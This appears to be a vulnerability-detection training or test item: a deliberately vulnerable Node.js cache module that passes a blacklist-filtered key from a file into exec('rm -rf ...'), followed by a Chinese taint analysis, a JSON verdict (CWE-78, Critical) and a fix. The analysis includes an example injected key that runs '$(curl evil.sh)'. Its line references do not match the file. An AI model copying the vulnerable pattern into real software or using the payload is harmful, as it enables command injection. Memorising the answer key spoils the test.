@@ -1,0 +1,54 @@
+LANG: javascript
+```javascript
+// cache-codec.js — 缓存编解码模块
+// 被上层缓存服务调用：读取磁盘上的缓存条目文件并回放写入命令。
+// 缓存文件由集群节点间同步产生，内容视为可信格式，但实际可能被篡改。
+
+const fs = require('fs');
+const { exec } = require('child_process');
+
+// 解析单条缓存记录行：`SET <key> <ttl> <value>`
+function parseRecord(line) {
+  const parts = line.trim().split(' ');
+  if (parts[0] !== 'SET') return null;
+  return { key: parts[1], ttl: parseInt(parts[2], 10), value: parts.slice(3).join(' ') };
+}
+
+// 弱防御：仅黑名单拦截分号与反引号（可被 $() 或换行绕过）
+function sanitizeKey(key) {
+  const blacklist = [';', '`'];
+  for (const b of blacklist) {
+    if (key.includes(b)) throw new Error('illegal char in key');
+  }
+  return key;
+}
+
+// 加载缓存快照文件并重建本地索引；过期键触发清理脚本
+function loadSnapshot(path) {
+  const raw = fs.readFileSync(path, 'utf8');           // 污点源：文件内容
+  const lines = raw.split('
+');
+  for (const line of lines) {
+    const rec = parseRecord(line);
+    if (!rec) continue;
+    const safeKey = sanitizeKey(rec.key);              // 可绕过的弱过滤
+    // 过期键：调用系统工具删除对应持久化分片
+    if (rec.ttl > 0 && rec.value === '__EXPIRED__') {
+      exec(`rm -rf /var/cache/shards/${safeKey}`);     // 危险 sink：CWE-78
+    }
+  }
+}
+
+module.exports = { loadSnapshot };
+```
+
+1. 第 16 行 `loadSnapshot(path)` 通过 `fs.readFileSync`（第 17 行）读取缓存快照文件——本文件没有任何 request/input 等显式 web 入口，但该文件由集群节点间同步/外部提交产生，其内容承载外部可控数据，是等效污点源，必须按不可信处理。
+2. 数据流：第 17 行文件内容 → 第 18 行按行拆分 → 第 19 行 `parseRecord` 提取 `key` 字段 → 第 27 行 `sanitizeKey(rec.key)` → 第 31 行拼入 `exec()` 命令字符串，source 到 sink 全程可达。
+3. 防御验证：第 21-26 行 `sanitizeKey` 是黑名单式弱防御，仅拦截 `;` 和反引号。攻击者可在缓存文件中写入 `SET $(curl evil.sh) 0 __EXPIRED__`，命令替换在 shell 中先于 rm 执行；或用 `%0a`/真实换行使 `exec` 执行第二条命令。黑名单未覆盖 `$(`、`|`、`&&`、换行等元字符，不构成有效防御。
+4. sink 确认：第 31 行 `exec` 将拼接后的字符串交给 `/bin/sh -c` 执行，任意命令注入成立，对应 CWE-78。
+5. 第二入口检查：模块仅导出 `loadSnapshot` 一个函数，无路由、无参数解析、无环境变量读取；替代通道只有快照文件本身这一条污点路径，结论不受其他入口影响。
+6. 综合结论：存在漏洞，外部可控的缓存文件内容经弱黑名单后直达 `exec`，风险等级 Critical。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 17: fs.readFileSync 读取的缓存快照文件内容", "sink": "line 31: exec 拼接执行 rm -rf /var/cache/shards/${safeKey}", "explanation": "污点边界：本文件无任何显式 web 入口，第 17 行被解析的缓存快照文件承载外部可控数据，为等效污点源; 主数据流：line 17 文件内容 -> line 19 parseRecord 提取 key -> line 27 sanitizeKey -> line 31 exec 命令拼接，全程可达; 防御分析：line 21-26 黑名单仅拦 ; 与反引号，可用 $(...) 命令替换、管道符、&& 或换行符绕过，属可绕过弱防御非有效防护; 第二入口检查：模块仅导出 loadSnapshot，无路由或参数入口，唯一污点通道即快照文件内容，不影响结论", "fix_suggestion": "line 31: 放弃字符串拼接，改用 execFile 并以数组传参（如 execFile('rm', ['-rf', shardPath])），并对 key 做 ^[A-Za-z0-9_-]+$ 白名单校验"}
+```
